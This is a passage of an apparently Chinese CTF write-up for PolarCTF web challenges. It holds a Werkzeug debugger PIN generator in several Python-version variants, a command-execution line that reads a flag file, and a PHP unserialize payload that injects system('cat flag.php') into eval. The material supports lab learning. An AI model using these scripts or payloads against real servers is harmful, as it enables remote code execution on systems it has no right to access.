os.popen(&quot;cat /flaggggg&quot;).read() 
&#39;flag{873894c49201cd995ee2c52e6270630d}&#39;
</code></pre>
<p><img src="/images/polarctf/image-20240116151400389.png" alt="image-20240116151400389"></p>
<h6 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h6><p>这里一定要注意不同的python版本的计算pin值是不同的，<br><code>python3.5的get_machine_id()值为/etc/machine-id+/proc/self/cgroup</code><br>下面是脚本</p>
<pre><code class="python">
import hashlib
from itertools import chain
probably_public_bits = [
    &#39;root&#39;,# username
    &#39;flask.app&#39;,# modname
    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
    &#39;/usr/local/lib/python3.5/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
]

private_bits = [
    &#39;2485377892354&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address
    #/sys/class/net/eth0/address
    &#39;32e48d371198e8420c53b0a1fa37e94d&#39;# get_machine_id(), /etc/machine-id+/proc/self/cgroup
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode(&#39;utf-8&#39;)
    h.update(bit)
h.update(b&#39;cookiesalt&#39;)

cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b&#39;pinsalt&#39;)
    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
</code></pre>
<p>python3.6</p>
<pre><code class="python">#MD5
import hashlib
from itertools import chain
probably_public_bits = [
     &#39;flaskweb&#39;# username
     &#39;flask.app&#39;,# modname
     &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
     &#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
]

private_bits = [
     &#39;25214234362297&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address
     &#39;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#39;# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode(&#39;utf-8&#39;)
    h.update(bit)
h.update(b&#39;cookiesalt&#39;)

cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]

num = None
if num is None:
   h.update(b&#39;pinsalt&#39;)
   num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
   for group_size in 5, 4, 3:
       if len(num) % group_size == 0:
          rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
                      for x in range(0, len(num), group_size))
          break
       else:
          rv = num

print(rv)

</code></pre>
<p>python3.7</p>
<pre><code class="python">
#MD5
import hashlib
from itertools import chain
probably_public_bits = [
     &#39;flaskweb&#39;# username
     &#39;flask.app&#39;,# modname
     &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
     &#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
]
 
private_bits = [
     &#39;25214234362297&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address
     &#39;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#39;# get_machine_id(), /etc/machine-id
]
 
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode(&#39;utf-8&#39;)
    h.update(bit)
h.update(b&#39;cookiesalt&#39;)
 
cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
 
num = None
if num is None:
   h.update(b&#39;pinsalt&#39;)
   num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
 
rv =None
if rv is None:
   for group_size in 5, 4, 3:
       if len(num) % group_size == 0:
          rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
                      for x in range(0, len(num), group_size))
          break
       else:
          rv = num
 
print(rv)
</code></pre>
<p>python3.8的machine_id由三个合成</p>
<pre><code class="python">
#sha1
import hashlib
from itertools import chain
probably_public_bits = [
    &#39;root&#39;# /etc/passwd
    &#39;flask.app&#39;,# 默认值
    &#39;Flask&#39;,# 默认值
    &#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39; # 报错得到
]

private_bits = [
    &#39;2485377581187&#39;,#  /sys/class/net/eth0/address 16进制转10进制
    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
    &#39;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#39;#  /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode(&#39;utf-8&#39;)
    h.update(bit)
h.update(b&#39;cookiesalt&#39;)

cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b&#39;pinsalt&#39;)
    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
</code></pre>
<h5 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice"></a>php very nice</h5><pre><code class="php">&lt;?php
 highlight_file(__FILE__);
 class Example
 {
     public $sys=&#39;system(&quot;ls&quot;);&#39;;
     function __destruct(){
         eval($this-&gt;sys);
     }
 }
$s = new Example();
echo serialize($s);
 ?&gt;
 http://3b626d75-482d-4c21-a603-ee2c36749c68.www.polarctf.com:8090/?a=O:7:&quot;Example&quot;:1:{s:3:&quot;sys&quot;;s:23:&quot;system(&#39;cat flag.php&#39;);&quot;;}
</code></pre>
